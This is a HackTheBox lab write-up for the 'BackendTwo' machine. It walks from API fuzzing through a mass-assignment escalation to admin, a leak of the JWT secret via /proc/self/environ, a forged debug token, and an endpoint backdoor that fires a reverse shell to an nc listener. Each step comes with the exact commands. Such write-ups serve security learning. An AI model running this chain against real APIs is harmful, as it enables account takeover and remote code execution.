---
title: "BackendTwo"
date: 2026-09-20 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, medium, api, fastapi, mass-assignment, idor, jwt, file-read, rce, credential-reuse]
description: "BackendTwo is a medium-difficulty Linux box built entirely around a JSON API. Fuzzing a FastAPI service uncovers hidden signup/login routes; a mass-assignment flaw promotes a self-registered account to admin, and an admin file-read endpoint leaks the process environment — exposing the API key the app reuses as its JWT signing secret. Forging a debug token unlocks an arbitrary file-write that backdoors an endpoint for a shell. This post covers recon through the user flag."
image:
    path: /assets/Images/backendtwo-001_foothold_user-flag.png
---

## Overview

BackendTwo is a medium-difficulty Linux box with no traditional website — just a JSON API on port 80 (FastAPI behind uvicorn). The path to user is pure API abuse: discover hidden endpoints through POST-method fuzzing, register an account, escalate it to admin via a mass-assignment bug, then use an admin file-read endpoint to steal the app's JWT signing secret from `/proc/self/environ`. With the secret you forge a token carrying a `debug` claim, which unlocks an arbitrary file-write — enough to backdoor an endpoint and land a shell. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 150.0,150.0 111.2,203.4 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

API-abuse box chaining POST-method fuzzing, IDOR, mass-assignment, env-leaked JWT secret, forged debug token, and an endpoint-backdoor file-write; bespoke multi-primitive web chain with no CVE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 8.2p1 (Ubuntu) | standard |
| 80   | uvicorn / FastAPI | returns JSON `{"msg":"UHC Api v2.0"}` |

```bash
nmap -sC -sV 10.129.227.139
```

Port 80 answers with JSON and a `server: uvicorn` header — a Python ASGI app, not a normal site. Everything interesting lives under the API.

## Enumeration

Browsing the API reveals a nested structure:

```bash
curl -s 10.129.227.139/api          # {"endpoints":"/v1"}
curl -s 10.129.227.139/api/v1       # {"endpoints":["/user","/admin"]}
curl -s 10.129.227.139/api/v1/user/1
```

`/api/v1/user/1` returns the administrator's record (`"is_superuser": true`) — a classic IDOR on a sequential ID. The `/user` and `/admin` roots are otherwise quiet on GET, so we fuzz them with **POST** (FastAPI routes are often method-specific, and GET-only fuzzers miss them):

```bash
gobuster dir -m POST -b 404,405 -u http://10.129.227.139/api/v1/user/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This uncovers `/login` and `/signup`.

## Foothold

**1. Register and authenticate.** Note the content-type switch — signup takes JSON, login takes form-urlencoded:

```bash
curl -s -X POST http://10.129.227.139/api/v1/user/signup \
  -H 'Content-Type: application/json' \
  -d '{"email":"melo@backendtwo.htb","password":"<pass>"}'

curl -s -d 'username=melo@backendtwo.htb&password=<pass>' \
  http://10.129.227.139/api/v1/user/login        # -> JWT access_token
```

**2. Mass assignment → admin.** The profile-edit endpoint is documented to take only `profile`, but it binds the whole JSON body onto the user object. We smuggle in `is_superuser`:

```bash
curl -s -X PUT http://10.129.227.139/api/v1/user/<id>/edit \
  -H 'Authorization: Bearer <jwt>' -H 'Content-Type: application/json' \
  -d '{"profile":"x","is_superuser":true}'          # {"result":"true"}
```

Our account is now admin.

**3. File read → steal the JWT secret.** Admin endpoints include `/admin/file/<path>`, where the path is base64url-encoded in the URL. Reading `/proc/self/environ` leaks the process environment:

```bash
curl -s "http://10.129.227.139/api/v1/admin/file/$(echo -n /proc/self/environ | base64 | tr '/+' '_-' | tr -d '=')" \
  -H 'Authorization: Bearer <jwt>' | python3 -c "import sys,json;print(json.load(sys.stdin)['file'])"
```

The output contains `API_KEY=<redacted>`. Reading the app source (`/home/htb/app/core/config.py`) confirms the catch: `JWT_SECRET = os.environ['API_KEY']` — the environment variable *is* the token signing key.

**4. Forge a debug token → file write.** The file-write path rejects normal tokens ("Debug key missing from JWT"). With the secret we decode our token, add `debug:true`, and re-sign it:

```bash
python3 -c "import jwt; t='<jwt>'; p=jwt.decode(t,options={'verify_signature':False}); p['debug']=True; print(jwt.encode(p,'<secret>','HS256'))"
```

**5. Backdoor an endpoint → shell.** POST-write a modified `user.py` that triggers a reverse shell on a sentinel ID, then call it:

```bash
# write the patched endpoint source (debug JWT), then:
nc -nlvp 4444
curl -s http://10.129.227.139/api/v1/user/-1337     # fires the shell as htb
```

A connection lands as `htb`.

## User flag

```bash
id        # uid=1000(htb)
cat /home/htb/user.txt   # HTB{...}
```

![user flag](/assets/Images/backendtwo-001_foothold_user-flag.png)

Access as `htb` achieved.

Privilege escalation is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/BackendTwo-avatar.png" alt="BackendTwo" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
